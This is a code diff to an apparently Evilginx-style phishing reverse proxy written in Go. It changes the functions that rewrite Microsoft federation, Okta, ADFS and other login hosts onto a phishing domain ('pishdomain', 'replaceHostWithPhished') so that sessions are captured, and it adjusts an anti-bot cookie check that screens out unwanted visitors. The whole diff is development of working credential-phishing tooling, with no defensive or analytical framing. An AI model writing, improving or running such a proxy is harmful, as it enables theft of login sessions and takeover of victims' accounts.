@@ -188,16 +188,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			msg, err := req.Cookie("RUSSIA")
 
-			if err != nil {
-				log.Error("msg: %v", err)
-				return p.antiddos(req, ps, req_url, "USA")
+			//msg, err := req.Cookie("RUSSIA")
+			//
+			//if err != nil {
+			//	log.Error("msg: %v", err)
+			//	return p.antiddos(req, ps, req_url, "USA")
+			//} else {
+			//		return p.antiddos(req, ps, req_url, "USAt")
+			//	}
+			//	log.Important(msg.Value)
+			//}
 
 			} else {
-				if !p.isForwarderUrlBy2(req) {
-					return p.antiddos(req, ps, req_url, "USAt")
-				}
-				log.Important(msg.Value)
-			}
+			// END ANTIBOT
 
 			// handle ip blacklist
 			from_ip := req.RemoteAddr
@@ -1613,8 +1616,10 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			log.Warning("u HOST: %s", strings.ToLower(u.Host))
 			myString := string(body[:])
 
-			if strings.Contains(myString, "FederationRedirectUrl") {
+			if strings.Contains(myString, "FederationRedirectUrl") && !strings.Contains(myString, "<script type=\"text/javascript\">") {
 				//log.Warning(myString)
+				log.Warning("FederationRedirectUrl")
+				//os.Exit(0)
 
 				if strings.Contains(myString, strings.ToLower(u.Host)) {
 					subdomain := ""
@@ -1643,78 +1648,21 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 					log.Warning("data: %s", data)
 					pl.proxyHosts = append(pl.proxyHosts, data)
 					hosts = append(hosts, combineHost(subdomain, domain))
-					sub_map[combineHost(subdomain, domain)] = subdomain + "." + pishdomain
+					log.Warning("checking")
+					log.Warning(subdomain + "." + pishdomain)
+					log.Warning("hosts: ", hosts)
+					if len(subdomain) != 0 {
+						sub_map[combineHost(subdomain, domain)] = subdomain + "." + pishdomain
+					} else {
+						sub_map[combineHost(subdomain, domain)] = pishdomain
+					}
+
 					p.isAdded = true
 					//log.Warning("isAdded: %t", p.isAdded)
 					//}
 				}
 				//fmt.Println(objmap[0]["FederationRedirectUrl"])
 			}
-
-			//if strings.Contains(strings.ToLower(u.Host), ".okta.com") {
-			//	if p.isAdded == false {
-			//		log.Warning("ENTERED OKTA")
-			//		log.Warning("URL ACCESS NOW : %s", strings.ToLower(u.Host))
-			//		parts := strings.Split(strings.ToLower(u.Host), ".")
-			//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-			//		log.Warning("domain inside body: %s", domain)
-			//		subdomain := parts[len(parts)-3]
-			//		log.Warning("subdomain inside body: %s", subdomain)
-			//
-			//		data := ProxyHost{
-			//			phish_subdomain: subdomain,
-			//			domain:          domain,
-			//			orig_subdomain:  subdomain,
-			//			is_landing:      false,
-			//			handle_session:  true,
-			//			auto_filter:     true,
-			//		}
-			//		log.Warning("data: %s", data)
-			//		pl.proxyHosts = append(pl.proxyHosts, data)
-			//		hosts = append(hosts, combineHost(subdomain, domain))
-			//		sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
-			//		p.isAdded = true
-			//	}
-			//
-			//}
-
-			//if strings.Contains(strings.ToLower(u.Host), "adfs") {
-			//	if p.isAdded2 == false {
-			//		parts := strings.Split(strings.ToLower(u.Host), ".")
-			//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-			//		log.Warning("domain inside body: %s", domain)
-			//		subdomain := parts[len(parts)-3]
-			//		log.Warning("subdomain inside body: %s", subdomain)
-			//
-			//		data := ProxyHost{
-			//			phish_subdomain: subdomain,
-			//			domain:          domain,
-			//			orig_subdomain:  subdomain,
-			//			is_landing:      false,
-			//			handle_session:  true,
-			//			auto_filter:     false,
-			//		}
-			//		log.Warning("data: %s", data)
-			//		pl.proxyHosts = append(pl.proxyHosts, data)
-			//		hosts = append(hosts, combineHost(subdomain, domain))
-			//		sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
-			//		p.isAdded2 = true
-			//	}
-			//
-			//}
-
-			//log.Warning("ENTERED PATCHURLS")
-			//log.Warning("s_url: %s", strings.ToLower(u.Host))
-			//log.Warning("PHISHLETS site : %s", pl.Site)
-			//log.Warning("PHISHLETS name : %s", pl.Name)
-			//log.Warning("PHISHLETS ProxyHost : %s", pl.proxyHosts)
-			//log.Warning("PHISHLETS DOMAIN : %s", pl.domains)
-			//log.Warning("PHISHLETS ProxyHosts : %s", pl.proxyHosts)
-
-			//err = json.Unmarshal(pl, &pl)
-			//if err != nil {
-			//	return ""
-			//}
 
 			sort.Slice(hosts, func(i, j int) bool {
 				return len(hosts[i]) > len(hosts[j])
@@ -2090,44 +2038,19 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 			}
 			// MICROSOFT
 			//|| strings.Contains(ph.domain, hostname)
-			//for _, ph := range pl.proxyHosts {
-			//	if strings.Contains(hostname, ph.domain) {
-			//		if hostname == ph.domain {
-			//			continue
-			//		}
-			//		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-			//			continue
-			//		}
-			//		parts := strings.Split(strings.ToLower(hostname), ".")
-			//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-			//		log.Warning("domain inside replaceHostWithPhished: %s", domain)
-			//		subdomain := parts[len(parts)-3]
-			//		log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
-			//		data := ProxyHost{
-			//			phish_subdomain: subdomain,
-			//			domain:          domain,
-			//			orig_subdomain:  subdomain,
-			//			is_landing:      false,
-			//			handle_session:  true,
-			//			auto_filter:     true,
-			//		}
-			//		//		log.Warning("data: %s", data)
-			//		pl.proxyHosts = append(pl.proxyHosts, data)
-			//	}
-			//}
-
-			// yahooo
-			for _, _ = range pl.proxyHosts {
-
-				if checkingSomething(hostname, pl) == false {
-					continue
-				} else {
-					log.Warning("ADDING SOMETHING")
+			for _, ph := range pl.proxyHosts {
+				if strings.Contains(hostname, ph.domain) {
+					if hostname == ph.domain {
+						continue
+					}
+					if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+						continue
+					}
 					parts := strings.Split(strings.ToLower(hostname), ".")
 					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("adding domain inside replaceHostWithPhished: %s", domain)
+					log.Warning("domain inside replaceHostWithPhished: %s", domain)
 					subdomain := parts[len(parts)-3]
-					log.Warning("adding subdomain inside replaceHostWithPhished: %s", subdomain)
+					log.Warning("subdomain inside replaceHostWithPhished: %s", subdomain)
 					data := ProxyHost{
 						phish_subdomain: subdomain,
 						domain:          domain,
@@ -2136,49 +2059,74 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 						handle_session:  true,
 						auto_filter:     true,
 					}
-
+					//		log.Warning("data: %s", data)
 					pl.proxyHosts = append(pl.proxyHosts, data)
-
 				}
-
-				//if strings.Contains(hostname, ph.domain) || strings.Contains(ph.domain, hostname) {
-				//
-				//	for _, ph2 := range pl.proxyHosts {
-				//		if hostname == combineHost(ph2.orig_subdomain, ph2.domain) {
-				//			log.Warning(combineHost(ph2.orig_subdomain, ph2.domain))
-				//			continue
-				//			//os.Exit(0)
-				//		}
-				//		if hostname == ph2.domain {
-				//			continue
-				//		}
-				//		if hostname == ph.domain {
-				//			continue
-				//		}
-				//		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-				//			continue
-				//		}
-				//
-				//		parts := strings.Split(strings.ToLower(hostname), ".")
-				//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-				//		log.Warning("adding domain inside replaceHostWithPhished: %s", domain)
-				//		subdomain := parts[len(parts)-3]
-				//		log.Warning("adding subdomain inside replaceHostWithPhished: %s", subdomain)
-				//		data := ProxyHost{
-				//			phish_subdomain: subdomain,
-				//			domain:          domain,
-				//			orig_subdomain:  subdomain,
-				//			is_landing:      false,
-				//			handle_session:  true,
-				//			auto_filter:     true,
-				//		}
-				//		//		log.Warning("data: %s", data)
-				//		pl.proxyHosts = append(pl.proxyHosts, data)
-				//
-				//	}
-				//}
-
 			}
+
+			// yahooo
+			//for _, _ = range pl.proxyHosts {
+			//
+			//	if checkingSomething(hostname, pl) == false {
+			//		continue
+			//	} else {
+			//		log.Warning("ADDING SOMETHING")
+			//		parts := strings.Split(strings.ToLower(hostname), ".")
+			//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+			//		log.Warning("adding domain inside replaceHostWithPhished: %s", domain)
+			//		subdomain := parts[len(parts)-3]
+			//		log.Warning("adding subdomain inside replaceHostWithPhished: %s", subdomain)
+			//		data := ProxyHost{
+			//			phish_subdomain: subdomain,
+			//			domain:          domain,
+			//			orig_subdomain:  subdomain,
+			//			is_landing:      false,
+			//			handle_session:  true,
+			//			auto_filter:     true,
+			//		}
+			//
+			//		pl.proxyHosts = append(pl.proxyHosts, data)
+			//
+			//	}
+			//
+			//	//if strings.Contains(hostname, ph.domain) || strings.Contains(ph.domain, hostname) {
+			//	//
+			//	//	for _, ph2 := range pl.proxyHosts {
+			//	//		if hostname == combineHost(ph2.orig_subdomain, ph2.domain) {
+			//	//			log.Warning(combineHost(ph2.orig_subdomain, ph2.domain))
+			//	//			continue
+			//	//			//os.Exit(0)
+			//	//		}
+			//	//		if hostname == ph2.domain {
+			//	//			continue
+			//	//		}
+			//	//		if hostname == ph.domain {
+			//	//			continue
+			//	//		}
+			//	//		if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+			//	//			continue
+			//	//		}
+			//	//
+			//	//		parts := strings.Split(strings.ToLower(hostname), ".")
+			//	//		domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+			//	//		log.Warning("adding domain inside replaceHostWithPhished: %s", domain)
+			//	//		subdomain := parts[len(parts)-3]
+			//	//		log.Warning("adding subdomain inside replaceHostWithPhished: %s", subdomain)
+			//	//		data := ProxyHost{
+			//	//			phish_subdomain: subdomain,
+			//	//			domain:          domain,
+			//	//			orig_subdomain:  subdomain,
+			//	//			is_landing:      false,
+			//	//			handle_session:  true,
+			//	//			auto_filter:     true,
+			//	//		}
+			//	//		//		log.Warning("data: %s", data)
+			//	//		pl.proxyHosts = append(pl.proxyHosts, data)
+			//	//
+			//	//	}
+			//	//}
+			//
+			//}
 
 			for _, ph := range pl.proxyHosts {
 
